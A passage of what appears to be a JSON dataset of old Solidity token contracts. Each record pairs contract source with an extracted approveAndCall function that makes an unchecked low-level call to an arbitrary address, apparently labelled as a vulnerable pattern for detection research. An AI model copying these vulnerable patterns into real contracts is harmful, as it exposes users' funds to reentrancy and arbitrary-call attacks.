EndedAndGoalNotReached,\n GoingAndGoalReached,\n EndedAndGoalReached\n }\n address public owner;\n uint public startDate;\n uint public fundBalance;\n uint public valuePerToken;\n uint public tokensSent;\n mapping (address => uint) public contributions;\n mapping (address => uint) public sentTokens;\n Stages public stage = Stages.Deployed;\n modifier onlyOwner() {\n if (msg.sender != owner) {\n revert();\n }\n _;\n }\n modifier atStage(Stages _stage) {\n if (stage != _stage) {\n revert();\n }\n _;\n }\n modifier atStageOR(Stages _stage1, Stages _stage2) {\n if (stage != _stage1 && stage != _stage2) {\n revert();\n }\n _;\n }\n modifier timedTransitions() {\n uint timeElapsed = now - startDate;\n if (timeElapsed >= DURATION) {\n if (stage == Stages.GoingAndGoalNotReached) {\n stage = Stages.EndedAndGoalNotReached;\n } else if (stage == Stages.GoingAndGoalReached) {\n stage = Stages.EndedAndGoalReached;\n }\n }\n _;\n }\n function checkInvariants() constant internal {\n if (fundBalance > this.balance) {\n revert();\n }\n }\n function emergencyCall()\n public\n returns (bool)\n {\n if (fundBalance > this.balance) {\n if (this.balance > 0 && !SingularDTVWorkshop.send(this.balance)) {\n revert();\n }\n return true;\n }\n return false;\n }\n function fund()\n public\n timedTransitions\n atStageOR(Stages.GoingAndGoalNotReached, Stages.GoingAndGoalReached)\n payable\n returns (uint)\n {\n uint tokenCount = (msg.value * (10**18)) / valuePerToken;\n require(tokenCount > 0);\n if (tokensSent + tokenCount > CAP) {\n tokenCount = CAP - tokensSent;\n }\n tokensSent += tokenCount;\n uint contribution = (tokenCount * valuePerToken) / (10**18);\n if (msg.value > contribution && !msg.sender.send(msg.value - contribution)) {\n revert();\n }\n fundBalance += contribution;\n contributions[msg.sender] += contribution;\n sentTokens[msg.sender] += tokenCount;\n if (!singularDTVToken.transfer(msg.sender, tokenCount)) {\n revert();\n }\n if (stage == Stages.GoingAndGoalNotReached) {\n if (tokensSent >= TOKEN_TARGET) {\n stage = Stages.GoingAndGoalReached;\n }\n }\n if (stage == Stages.GoingAndGoalReached) {\n if (tokensSent == CAP) {\n stage = Stages.EndedAndGoalReached;\n }\n }\n checkInvariants();\n Contributed(msg.sender, contribution, tokenCount);\n return tokenCount;\n }\n function withdrawContribution()\n public\n timedTransitions\n atStage(Stages.EndedAndGoalNotReached)\n returns (uint)\n {\n uint tokensReceived = sentTokens[msg.sender];\n sentTokens[msg.sender] = 0;\n if (!singularDTVToken.transferFrom(msg.sender, owner, tokensReceived)) {\n revert();\n }\n uint contribution = contributions[msg.sender];\n contributions[msg.sender] = 0;\n fundBalance -= contribution;\n if (contribution > 0) {\n msg.sender.transfer(contribution);\n }\n checkInvariants();\n return contribution;\n }\n function withdrawForWorkshop()\n public\n timedTransitions\n atStage(Stages.EndedAndGoalReached)\n returns (bool)\n {\n uint value = fundBalance;\n fundBalance = 0;\n require(value > 0);\n uint networkFee = value * SingularDTVWorkshopFee / 100;\n workshop.transfer(value - networkFee);\n SingularDTVWorkshop.transfer(networkFee);\n uint remainingTokens = CAP - tokensSent;\n if (remainingTokens > 0 && !singularDTVToken.transfer(owner, remainingTokens)) {\n revert();\n }\n checkInvariants();\n return true;\n }\n function withdrawUnsentTokensForOwner()\n public\n timedTransitions\n atStage(Stages.EndedAndGoalNotReached)\n returns (uint)\n {\n uint remainingTokens = CAP - tokensSent;\n if (remainingTokens > 0 && !singularDTVToken.transfer(owner, remainingTokens)) {\n revert();\n }\n checkInvariants();\n return remainingTokens;\n }\n function changeValuePerToken(uint valueInWei)\n public\n onlyOwner\n atStage(Stages.Deployed)\n returns (bool)\n {\n valuePerToken = valueInWei;\n return true;\n }\n function updateStage()\n public\n timedTransitions\n returns (Stages)\n {\n return stage;\n }\n function start()\n public\n onlyOwner\n atStage(Stages.Deployed)\n returns (uint)\n {\n if (!singularDTVToken.transferFrom(msg.sender, this, CAP)) {\n revert();\n }\n startDate = now;\n stage = Stages.GoingAndGoalNotReached;\n checkInvariants();\n return startDate;\n }\n function SingularDTVLaunch(\n address singularDTVTokenAddress,\n address _workshop,\n address _owner,\n uint _total,\n uint _unit_price,\n uint _duration,\n uint _threshold,\n uint _singulardtvwoskhop_fee\n ) {\n singularDTVToken = AbstractSingularDTVToken(singularDTVTokenAddress);\n workshop = _workshop;\n owner = _owner;\n CAP = _total;\n valuePerToken = _unit_price;\n DURATION = _duration;\n TOKEN_TARGET = _threshold;\n SingularDTVWorkshopFee = _singulardtvwoskhop_fee;\n }\n function ()\n public\n payable\n {\n if (stage == Stages.GoingAndGoalNotReached || stage == Stages.GoingAndGoalReached)\n fund();\n else if (stage == Stages.EndedAndGoalNotReached)\n withdrawContribution();\n else\n revert();\n }\n}\ncontract TokitDeployer is Ownable {\n TokitRegistry public registry;\n mapping (uint8 => AbstractPaymentEscrow) public paymentContracts;\n event DeployedToken(address indexed _customer, uint indexed _projectId, address _token, address _fund);\n event DeployedCampaign(address indexed _customer, uint indexed _projectId, address _campaign);\n function TokitDeployer(address _owner, address _registry) {\n transferOwnership(_owner);\n registry = TokitRegistry(_registry);\n }\n function deployToken(\n address _customer, uint _projectId, uint8 _payedWith, uint _amountNeeded,\n address _wallet, string _name, string _symbol, uint _totalSupply\n )\n onlyOwner()\n {\n require(AbstractPaymentEscrow(paymentContracts[_payedWith]).getDeposit(_projectId) >= _amountNeeded);\n var (t,,) = registry.lookup(_customer, _projectId);\n require(t == address(0));\n SingularDTVFund fund = new SingularDTVFund();\n SingularDTVToken token = new SingularDTVToken(fund, _wallet, _name, _symbol, _totalSupply);\n fund.setup(token);\n registry.register(_customer, _projectId, token, fund);\n DeployedToken(_customer, _projectId, token, fund);\n }\n function deployCampaign(\n address _customer, uint _projectId,\n address _workshop, uint _total, uint _unitPrice, uint _duration, uint _threshold, uint _networkFee\n )\n onlyOwner()\n {\n var (t,f,c) = registry.lookup(_customer, _projectId);\n require(c == address(0));\n require(t != address(0) && f != address(0));\n SingularDTVLaunch campaign = new SingularDTVLaunch(t, _workshop, _customer, _total, _unitPrice, _duration, _threshold, _networkFee);\n registry.register(_customer, _projectId, campaign);\n DeployedCampaign(_customer, _projectId, campaign);\n }\n function setRegistryContract(address _registry)\n onlyOwner()\n {\n registry = TokitRegistry(_registry);\n }\n function setPaymentContract(uint8 _paymentType, address _paymentContract)\n onlyOwner()\n {\n paymentContracts[_paymentType] = AbstractPaymentEscrow(_paymentContract);\n }\n function deletePaymentContract(uint8 _paymentType)\n onlyOwner()\n {\n delete paymentContracts[_paymentType];\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb14ac"
  },
  "filename": "32341.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 10000000;\n totalSupply = 10000000;\n name = \"BrownSuga\";\n decimals = 4;\n symbol = \"BSG\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb14ad"
  },
  "filename": "32367.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 10000000000000000000000000;\n totalSupply = 10000000000000000000000000;\n name = \"Bananas\";\n decimals = 18;\n symbol = \"BNS\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb14ae"
  },
  "filename": "32382.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 100000000;\n totalSupply = 100000000;\n name = \"Iram Coin\";\n decimals = 0;\n symbol = \"IRAM\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb14af"
  },
  "filename": "32386.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract SKToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function SKToken(\n ) {\n balances[msg.sender] = 5000000;\n totalSupply = 5000000;\n name = \"SKToken\";\n decimals = 0;\n symbol = \"SKT\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb14b0"
  },
  "filename": "32392.sol",
  "content": "pragma solidity ^0.4.13;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) public constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) public returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\n function approve(address _spender, uint256 _value) public returns (bool success);\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n uint256 constant MAX_UINT256 = 2**256 - 1;\n function transfer(address _to, uint256 _value) public returns (bool success) {\n require(balances[msg.sender] >= _value);\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n uint256 allowance = allowed[_from][msg.sender];\n require(balances[_from] >= _value && allowance >= _value);\n balances[_to] += _value;\n balances[_from] -= _value;\n if (allowance < MAX_UINT256) {\n allowed[_from][msg.sender] -= _value;\n }\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant public returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract HumanStandardToken is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function HumanStandardToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) public {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb14b1"
  },
  "filename": "32400.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract BitcoinBlue is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function BitcoinBlue(\n ) {\n balances[msg.sender] = 2100000000000000;\n totalSupply = 2100000000000000;\n name = \"BitcoinBlue\";\n decimals = 8;\n symbol = \"BTCB\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb14b2"
  },
  "filename": "32434.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract Millenium is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function Millenium(\n ) {\n balances[msg.sender] = 10000000;\n totalSupply = 50000000;\n name = \"Millenium\";\n decimals = 0;\n symbol = \"MLL\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb14b3"
  },
  "filename": "32437.sol",
  "content": "pragma solidity ^0.4.18;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\npragma solidity ^0.4.11;\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable()\n public\n {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(\n address newOwner\n )\n onlyOwner\n public\n {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\npragma solidity ^0.4.8;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\npragma solidity ^0.4.8;\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n require(balances[msg.sender] >= _value);\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value);\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\npragma solidity ^0.4.8;\ncontract HumanStandardToken is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H0.1';\n function HumanStandardToken(\n uint256 _initialAmount,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol\n ) {\n balances[msg.sender] = _initialAmount;\n totalSupply = _initialAmount;\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n}\npragma solidity ^0.4.17;\ncontract Share is HumanStandardToken, Ownable {\n using SafeMath for uint;\n string public constant TOKEN_NAME = \"Vyral Token\";\n string public constant TOKEN_SYMBOL = \"SHARE\";\n uint8 public constant TOKEN_DECIMALS = 18;\n uint public constant TOTAL_SUPPLY = 777777777 * (10 ** uint(TOKEN_DECIMALS));\n mapping (address => uint256) lockedBalances;\n mapping (address => bool) public transferrers;\n function Share() HumanStandardToken(TOTAL_SUPPLY, TOKEN_NAME, TOKEN_DECIMALS, TOKEN_SYMBOL)\n public\n {\n transferrers[msg.sender] = true;\n }\n bool isTransferable = false;\n bool isBonusLocked = true;\n modifier canBeTransferred {\n require(transferrers[msg.sender] || isTransferable);\n _;\n }\n function transferReward(\n address _to,\n uint _value\n )\n canBeTransferred\n public\n returns (bool)\n {\n require(balances[msg.sender] >= _value);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n lockedBalances[_to] = lockedBalances[_to].add(_value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transfer(\n address _to,\n uint _value\n )\n canBeTransferred\n public\n returns (bool)\n {\n require(balances[msg.sender] >= _value);\n if(isBonusLocked) {\n require(balances[msg.sender].sub(lockedBalances[msg.sender]) >= _value);\n }\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(\n address _from,\n address _to,\n uint _value\n )\n canBeTransferred\n public\n returns (bool)\n {\n require(balances[_from] >= _value);\n require(allowed[_from][msg.sender] >= _value);\n if(isBonusLocked) {\n require(balances[_from].sub(lockedBalances[_from]) 